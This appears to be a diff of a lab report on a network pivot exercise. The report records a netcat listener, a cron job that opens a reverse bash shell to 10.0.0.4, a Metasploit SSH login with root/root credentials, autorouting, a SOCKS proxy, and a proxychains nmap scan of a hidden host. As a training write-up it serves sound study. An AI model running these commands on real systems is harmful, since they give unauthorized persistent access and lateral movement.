@@ -1,45 +1,85 @@
 ====================================================
-SESSION 24: PROXYCHAINS CONFIGURATION REVIEW
+SESSION 24: PIVOT OPERATION REPORT
 ====================================================
 
-FILE REVIEWED:
-    /etc/proxychains4.conf
+PHASE 1: PERSISTENT CRON
 
-PROXY MODES OBSERVED:
-    - dynamic_chain
-    - strict_chain
-    - round_robin_chain
-    - random_chain
+1. Listener started on Ubuntu VM:
 
-DNS SETTINGS:
-    proxy_dns
-    proxy_dns_old
-    proxy_dns_daemon 127.0.0.1:1053
+   nc -lvnp 4444
 
-REMOTE DNS SUBNET:
-    remote_dns_subnet 224
+2. SSH access to Web-Server-01:
 
-TIMEOUT SETTINGS:
-    tcp_read_time_out 15000
-    tcp_connect_time_out 8000
+   ssh root@172.50.0.10
 
-LOCAL NETWORK EXCLUSIONS:
-    localnet 10.0.0.0/255.0.0.0
-    localnet 172.16.0.0/255.240.0.0
-    localnet 192.168.0.0/255.255.0.0
+3. Cron persistence command used:
 
-PROXY TYPES SUPPORTED:
-    - http
-    - socks4
-    - socks5
-    - raw
+   * * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.4/4444 0>&1'
 
-PROXY LIST CONFIGURATION:
-    socks4 127.0.0.1 1080
 
-NOTES:
-    Proxychains was configured to support tunneling traffic
-    through a SOCKS proxy for lateral movement and hidden
-    network enumeration during the pivot operation lab.
+PHASE 2: METASPLOIT PIVOT
 
+1. Metasploit SSH login module used:
+
+   use auxiliary/scanner/ssh/ssh_login
+
+2. Settings used:
+
+   set RHOSTS 172.50.0.10
+   set USERNAME root
+   set PASSWORD root
+   run
+
+3. Route added to hidden network:
+
+   run autoroute -s 10.0.9.0/24
+
+4. SOCKS proxy module used:
+
+   use auxiliary/server/socks_proxy
+
+5. SOCKS proxy settings:
+
+   set SRVPORT 1080
+   set VERSION 4a
+   run
+
+
+PROXYCHAINS CONFIGURATION
+
+1. Proxychains config file reviewed:
+
+   /etc/proxychains4.conf
+
+2. Proxy list configured as:
+
+   socks4 127.0.0.1 1080
+
+3. Scan command used:
+
+   proxychains nmap -sT -Pn 10.0.9.50
+
+
+FINAL RESULT
+
+1. Hidden target scanned:
+
+   10.0.9.50
+
+2. Nmap result showed:
+
+   Nmap scan report for 10.0.9.50
+   Host is up
+
+3. Screenshot artifact:
+
+   pivot_success.png
+
+
+SUMMARY
+
+This lab showed how to use a compromised web server as a pivot
+point to reach a hidden internal host. Metasploit was used to
+create the route and SOCKS proxy. Proxychains was used with Nmap
+to scan the hidden system through the tunnel.
 ====================================================
